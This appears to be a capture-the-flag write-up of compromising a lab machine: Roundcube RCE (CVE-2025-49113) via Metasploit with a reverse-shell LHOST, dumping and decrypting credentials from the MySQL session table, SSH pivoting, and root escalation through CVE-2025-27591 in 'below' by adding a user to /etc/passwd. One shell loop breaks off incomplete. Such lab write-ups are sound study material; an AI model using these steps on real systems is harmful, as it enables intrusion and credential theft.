## Reconnaissance

Initial host and service discovery to identify the attack surface.

```bash
sudo nmap -sS -sV -A <target_ip>
```

Common findings on this box: HTTP on port 80 and SSH on port 22.

## Initial Access (Roundcube RCE)

The site runs Roundcube webmail. Use the About page to confirm the version (e.g., 1.6.10). A public RCE exists for versions <= 1.5.9 and <= 1.6.10.

PoC: [CVE-2025-49113](https://github.com/00xCanelo/CVE-2025-49113)

I couldn't successfully exploit this vulnerability with that PoC.

So I switched to Metasploit.

```bash
msfconsole
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set RHOSTS http://<target_ip>
set PASSWORD <password>
set USERNAME <username>
set LHOST <your_ip>
shell
script /dev/null -c bash # To have a proper bash shell
```

> The **tyler** username is provided in the machine description.
{: .prompt-info }

This gives us a shell on the target as `www-data`. Reuse the Roundcube credentials to switch to `tyler`:

```bash
su - tyler
```

## First Privilege Escalation

Run LinPEAS (or check manually). A local MySQL instance is configured for Roundcube and the DSN/credentials are in `config.inc.php`.

We can connect to the MySQL database with:

```bash
mysql -u roundcube -p -h localhost -P 3306 roundcube
```

The `users` table stores password hashes, which may take time to crack. Instead, inspect the `session` table; data often appears base64‑encoded and may contain encrypted credentials.

```bash
mysql -u roundcube -p -h localhost -P 3306 -B -e "SELECT * FROM session" roundcube > sessions.tsv
tail -n +2 sessions.tsv | awk -F'\t' '{print $1 "\t" $4}' | while IFS=$'\t' read id data; do
```

From this data, we recover Jacob's hashed password. We can decrypt it using a dedicated GitHub tool because it uses DES encryption, and the key is stored in `/var/www/html/roundcube/config/config.inc.php`.

I used this repository: [Password Decrypt Rcube](https://github.com/rafelsusanto/rcube-password-decryptor).
We recover Jacob's password and can log in to Roundcube as `jacob`.

## Pivot via ssh

Inside the mailbox, we find another password for `jacob` that was supposed to be changed but wasn't.
Using this password, we can SSH in as `jacob`.

## Final Escalation of Privilege

Use `sudo -l` to inspect Jacob's sudo privileges. We see that `jacob` can execute `below` as root without a password.
Searching for known issues, we find CVE-2025-27591, which allows arbitrary file write via `below`.
Using this [CVE-2025-27591 PoC](https://github.com/HOEUN-Visai/CVE-2025-27591-below-), we add a new root-level user to `/etc/passwd`.

Then we become root with `su` using the password we set.

## Takeaways

- Exploiting RCE in outdated RoundCube version to gain initial access.
- Extracting session data from MySQL database to retrieve user credentials.
- Leveraging misconfigured sudo permissions via CVE-2025-27591 to achieve root access.
